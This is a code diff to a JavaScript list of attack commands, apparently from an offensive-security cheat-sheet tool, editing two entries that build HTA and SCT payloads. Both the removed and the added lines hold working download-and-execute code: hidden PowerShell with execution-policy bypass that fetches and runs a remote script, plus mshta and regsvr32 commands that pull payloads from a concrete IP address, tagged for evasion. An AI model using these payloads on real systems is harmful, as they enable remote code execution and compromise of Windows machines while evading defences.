@@ -4933,16 +4933,16 @@ const COMMANDS = [
   },
   {
     title: "[GEN] Create HTA Payload",
-    desc: "Generate HTA file for mshta execution.",
-    code: "<html>\n<head>\n<script language=\"VBScript\">\n  Set shell = CreateObject(\"Wscript.Shell\")\n  shell.Run \"powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/s.ps1)\", 0\n  self.close\n</script>\n</head>\n</html>\n\n' Save as payload.hta, serve via HTTP\n' Execute: mshta http://IP:8889/payload.hta",
-    tags: ["lotl", "evasion", "code"],
+    desc: "Generate HTA file for mshta execution. Save as .hta file.",
+    code: "# payload.hta content:\n# ----------------------\n# &lt;html&gt;&lt;head&gt;\n# &lt;script language=\"VBScript\"&gt;\n#   Set shell = CreateObject(\"Wscript.Shell\")\n#   shell.Run \"powershell -ep bypass -c IEX(IWR http://IP:8889/s.ps1)\", 0\n#   self.close\n# &lt;/script&gt;&lt;/head&gt;&lt;/html&gt;\n\n# Execute:\nmshta http://168.144.166.97:8889/payload.hta",
+    tags: ["lotl", "evasion"],
     accent: "#ffee00"
   },
   {
     title: "[GEN] Create SCT Payload",
-    desc: "Generate SCT scriptlet for regsvr32 execution.",
-    code: "<?XML version=\"1.0\"?>\n<scriptlet>\n<registration progid=\"X\" classid=\"{00000000-0000-0000-0000-000000000000}\">\n<script language=\"JScript\">\n<![CDATA[\n  new ActiveXObject('WScript.Shell').Run('powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/s.ps1)',0);\n]]>\n</script>\n</registration>\n</scriptlet>\n\n' Save as payload.sct\n' Execute: regsvr32 /s /n /u /i:http://IP:8889/payload.sct scrobj.dll",
-    tags: ["lotl", "evasion", "code"],
+    desc: "Generate SCT scriptlet for regsvr32. Save as .sct file.",
+    code: "# payload.sct content:\n# ----------------------\n# &lt;?XML version=\"1.0\"?&gt;\n# &lt;scriptlet&gt;\n# &lt;registration progid=\"X\" classid=\"{GUID}\"&gt;\n# &lt;script language=\"JScript\"&gt;\n#   new ActiveXObject('WScript.Shell').Run('powershell ...',0);\n# &lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt;\n\n# Execute:\nregsvr32 /s /n /u /i:http://168.144.166.97:8889/payload.sct scrobj.dll",
+    tags: ["lotl", "evasion"],
     accent: "#ffee00"
   },
 ];
